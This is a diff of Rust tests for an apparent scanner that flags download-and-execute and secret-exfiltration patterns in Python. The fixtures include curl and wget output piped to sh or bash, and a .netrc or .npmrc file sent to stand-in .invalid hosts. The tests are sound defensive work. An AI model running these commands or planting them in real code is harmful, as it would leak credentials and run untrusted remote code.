@@ -379,7 +379,7 @@ fn identical_flows_are_deduplicated() {
 }
 
 #[test]
-fn non_python_scripts_get_no_signals_yet() {
+fn unregistered_languages_get_no_signals() {
     let sigs = run(&[("a.sh", "curl -d @/x/.npmrc https://x.example.invalid\n")]);
     assert!(sigs.is_empty(), "{sigs:#?}");
 }
@@ -640,4 +640,70 @@ fn g6_curl_piped_to_shell_is_download_exec() {
     assert_eq!(d, vec![2, 3, 4], "{sigs:#?}");
     let e: Vec<u32> = sinks(&sigs, "exec").iter().flat_map(|s| lines(s)).collect();
     assert_eq!(e, vec![5, 6], "{sigs:#?}");
+}
+
+// ---- Task 11 review fix round 1 (shared code) ----
+
+#[test]
+fn i1_dead_reimport_does_not_cancel_sink_alias() {
+    let py = "import subprocess as run_mod\n\
+              run_mod.run(\"curl https://x.invalid/i | sh\", shell=True)\n\
+              def unused():\n\
+              \x20   import json as run_mod\n";
+    let sigs = run(&[("a.py", py)]);
+    let d: Vec<u32> = sinks(&sigs, "download_exec")
+        .iter()
+        .flat_map(|s| lines(s))
+        .collect();
+    assert_eq!(d, vec![2], "{sigs:#?}");
+
+    let py = "from requests import post as send\n\
+              k = open(\"/x/.netrc\").read()\n\
+              send(\"https://x.example.invalid\", data=k)\n\
+              def unused():\n\
+              \x20   from json import dumps as send\n";
+    let sigs = run(&[("b.py", py)]);
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+}
+
+#[test]
+fn i2_comments_do_not_hide_python_arguments() {
+    let c: String = (0..70).map(|i| format!("# c{i}\n")).collect();
+    let py = format!(
+        "import os, subprocess\n\
+         t = os.getenv(\n# why\n\"GITHUB_TOKEN\")\n\
+         subprocess.run(\n{c}[\"sh\",\n{c}\"-c\", \"curl https://x.invalid/p | sh\"])\n"
+    );
+    let sigs = run(&[("a.py", &py)]);
+    assert_eq!(of_kind(&sigs, SOURCE).len(), 1, "{sigs:#?}");
+    assert_eq!(sinks(&sigs, "download_exec").len(), 1, "{sigs:#?}");
+    assert!(
+        hidden(&sigs, "parse_budget_exceeded").is_empty(),
+        "{sigs:#?}"
+    );
+
+    // More real elements than the cap: the analysis says it is partial.
+    let words: String = (0..70).map(|i| format!("\"w{i}\", ")).collect();
+    let wide = format!("import subprocess\nsubprocess.run([{words}\"sh\", \"-c\", \"x\"])\n");
+    assert_eq!(
+        hidden(&run(&[("b.py", &wide)]), "parse_budget_exceeded").len(),
+        1
+    );
+}
+
+#[test]
+fn m1_concatenated_shell_commands_are_download_exec() {
+    let py = "import os, subprocess\n\
+              os.system(\"curl \" + u + \" | sh\")\n\
+              subprocess.run([\"/usr/bin/env\", \"dash\", \"-c\", \"curl -s \" + u + \"|sh\"])\n\
+              subprocess.run(\"wget -qO- \" + u + \" | bash\", shell=True)\n\
+              os.system(\"cu\" + u + \"rl x | sh\")\n";
+    let sigs = run(&[("a.py", py)]);
+    let d: Vec<u32> = sinks(&sigs, "download_exec")
+        .iter()
+        .flat_map(|s| lines(s))
+        .collect();
+    assert_eq!(d, vec![2, 3, 4], "{sigs:#?}");
+    let e: Vec<u32> = sinks(&sigs, "exec").iter().flat_map(|s| lines(s)).collect();
+    assert_eq!(e, vec![5], "{sigs:#?}");
 }
